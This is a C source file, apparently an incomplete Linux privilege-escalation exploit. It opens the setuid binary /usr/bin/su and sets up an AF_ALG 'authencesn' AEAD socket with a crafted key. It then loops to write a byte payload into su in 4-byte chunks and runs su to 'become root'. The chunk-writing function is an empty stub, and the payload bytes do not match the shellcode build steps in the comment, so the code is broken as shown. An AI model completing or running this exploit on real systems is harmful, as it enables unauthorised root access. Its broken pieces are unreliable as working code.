#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_alg.h>

void send_chunk(int fd, int size, unsigned char* chun) {

    
}

int main(int argc, char** argv){
    // To generate, run:
    // gcc -c payloads/shellcode_x64.S
    // objcpy -O binary shellcode_x64.o payload_x86.raw
    // xxd -i payload_x86.raw > payload.txt
    unsigned char payload[] = {
        0x04, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
        0x47, 0x4e, 0x55, 0x00, 0x02, 0x00, 0x01, 0xc0, 0x04, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0xc0,
        0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    unsigned int payload_len = 48;    

    // Read setuid binary file descriptor 
	FILE* fptr = fopen("/usr/bin/su", "r");
    if (fptr == NULL) {
        perror("fopen");
        return 1;
    }
    int su_fd = fileno(fptr);
    printf("Opened \'/usr/bin/su\' with fd=%d\n", su_fd);

    // setup algif_aead socket and bind to authencesn
    int sock;

    struct sockaddr_alg sa = {
        .salg_family = AF_ALG,
        .salg_type = "aead",
        .salg_name = "authencesn(hmac(sha256),cbc(aes))"
    };

    sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (sock == -1) {
        perror("socket");
        return 1;
    }
    puts("Created sequential packet socket with crypto algorithm address family");    

    if (bind(sock, (struct sockaddr*) &sa, sizeof(sa)) == -1) {
        perror("bind");
        close(sock);
        return 1;
    }
    puts("Bound socket to authecesn(HMAC(SHA256), CBC(AES)), algo type is authenticated encryption with associated data");

    // C autopads with 0s
    unsigned char key[40] = {0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10};
    setsockopt(sock, SOL_ALG, ALG_SET_KEY, key, sizeof(key));

    puts("Set socket level option: key = ");
    for(int i = 0; i < 40; i++) {
        printf("%02x", key[i]);
    }
    putchar('\n');

    int authsize = 4;
    setsockopt(sock, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, &authsize, sizeof(authsize));

    puts("Set socket level option: AEAD length = 4 bytes");
      
    // Grab connection
    int sock_fd;
    sock_fd = accept(sock, NULL, 0);
    if (sock_fd == -1) {
        perror("connect");
        close(sock);
        return -1;
    } 
    puts("Connection Established");

    for (long unsigned int offset = 0; offset < sizeof(payload); offset += 4) {
        int type;
        socklen_t type_len = sizeof(type);
        getsockopt(sock_fd, SOL_SOCKET, SO_TYPE, &type, &type_len);
        printf("Sending 4B payload chunk to: socket.socket, fd=%d, family=%d, type=%d, proto=0\n", sock_fd, sa.salg_family, type);
        unsigned char chunk[4];
        memcpy(chunk, payload+offset, 4);
        send_chunk(su_fd, offset, chunk); 
    }

    // run setuid binary after corrupting it
    puts("Corruption complete! Becoming root now...");
    system("su");

    close(sock);
    return 0;
}
